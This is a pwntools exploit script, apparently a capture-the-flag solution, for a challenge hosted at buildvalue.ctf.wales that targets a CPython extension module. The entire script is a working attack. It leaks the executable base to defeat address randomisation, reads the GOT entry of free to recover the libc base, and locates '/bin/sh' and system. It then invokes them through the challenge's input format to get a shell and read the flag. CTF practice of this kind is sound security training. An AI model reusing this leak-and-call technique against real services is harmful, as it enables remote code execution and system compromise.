from pwn import *

context.log_level = "info"

context.binary = exe = ELF("../container/chall.cpython-314-x86_64-linux-gnu.so")
libc = ELF("./libc.so.6")

r = remote("buildvalue.ctf.wales",1337)

r.recvuntil(">")
r.sendline("l")
r.recvuntil("Result:")
leak = int(r.recvline())
exe.address = leak - (exe.address+0x2002)
log.info(f"Exe base: 0x{exe.address:x}")

r.sendline(f"y# {exe.got["free"]} 8")
r.recvuntil("Result:")
res = r.recvline()[3:][:-2].decode("unicode_escape")
free_libc = u64(res)
libc.address = free_libc - libc.symbols["free"]
log.info(f"Libc 0x{libc.address:x}")
x = next(libc.search(b"/bin/sh"))
r.sendline(f"O& {libc.symbols["system"]} {x}")

r.sendline(b"cat flag.txt")
r.interactive()
